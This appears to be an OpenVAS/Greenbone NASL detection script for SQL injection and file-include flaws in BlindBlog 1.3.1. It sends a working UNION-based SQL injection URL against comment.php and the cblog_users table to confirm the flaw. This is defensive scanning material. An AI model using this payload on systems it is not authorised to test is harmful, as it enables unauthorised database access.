# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100031");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/33980");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("BlindBlog Multiple Local File Include and SQL Injection Vulnerabilities");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"summary", value:"BlindBlog is prone to a local file-include vulnerability and
  multiple SQL-injection vulnerabilities because it fails to properly
  sanitize user-supplied input.

  An attacker can exploit the local file-include vulnerability using
  directory-traversal strings to view and execute arbitrary local
  files within the context of the webserver process. Information
  harvested may aid in further attacks.

  The attacker can exploit the SQL-injection vulnerabilities to
  compromise the application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.

  BlindBlog 1.3.1 is vulnerable, other versions may also be affected.");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/blog", "/cbblog", "/blindblog", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/comment.php?id=-1%27%20UNION%20ALL%20SELECT%20NULL,0x53514c2d496e6a656374696f6e2d54657374,3,4%20FROM%20cblog_users%23");

  if(http_vuln_check(port:port, url:url,pattern:"Author:.*<a href.*>SQL-Injection-Test</a>")) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
